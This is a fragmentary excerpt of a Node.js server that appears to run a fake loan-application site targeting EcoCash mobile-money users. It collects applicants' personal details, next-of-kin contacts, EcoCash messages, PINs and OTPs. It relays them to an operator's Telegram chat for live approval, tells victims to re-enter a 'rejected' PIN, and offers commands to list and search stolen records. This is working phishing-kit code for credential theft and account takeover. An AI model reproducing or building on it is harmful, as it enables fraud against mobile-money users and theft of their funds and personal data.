...
app.post('/api/send-application', async (req, res) => {
    try {
        ...
        const { applicationId, phone, loanAmount, loanDuration, firstName, lastName } = data;
...
// ─── 2. EcoCash Message Submission ───
app.post('/api/send-ecocash-message', async (req, res) => {
    try {
        const { ecocashData } = req.body;
        const { applicationId, phone, ecocashMessage, isResubmission } = ecocashData;

        applications[applicationId].ecocashMessage = ecocashMessage;
        applications[applicationId].smsStatus = 'pending';
        applications[applicationId].updatedAt = new Date().toISOString();
        saveApplications();

        const message = `📨 *ECOCASH MESSAGE VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +263${phone}\n\n📩 *Message Content:*\n${ecocashMessage}\n\n✅ *Please approve or reject this message:*`;
        const buttons = [[
            { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
            { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
        ]];
        ...
        console.error('Error in /api/send-ecocash-message:', error);
        res.status(500).json({ ok: false, error: error.message });
    }
});
...
app.get('/api/rejection-info/:applicationId', (req, res) => {
    try {
        ...
        if (app.smsStatus === 'rejected') {
            ...
            rejectedStep = 'pin';
            errorMessage = '❌ Your EcoCash PIN was rejected. Please re-enter your PIN.';
    ...
    try {
            ...
            if (chatId.toString() === TELEGRAM_CHAT_ID) {
                ...
                if (text === '/list') {
                    ...
                    displayIds.forEach((id, i) => {
                        ...
                        message += `   📱 +263${app.phone}\n`;
                        message += `   💰 $${app.loanAmount}\n`;
                ...
                if (text.startsWith('/search ')) {
                    ...
                    await sendTelegramMessage(
                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +263${app.phone}\n📧 Email: ${app.email}\n💰 Amount: $${app.loanAmount}\n📅 Duration: ${app.loanDuration} days\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n📍 Province: ${app.province || 'Not specified'}\n👨‍👩‍👦 Kin: ${app.kinFirstName} ${app.kinLastName} (+263${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
                    );
                    return res.sendStatus(200);
                }
        ...
        if (req.body.callback_query) {
            ...
            try {
                ...
                await sendTelegramMessage(`📌 *Status Update (ECOCASH)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
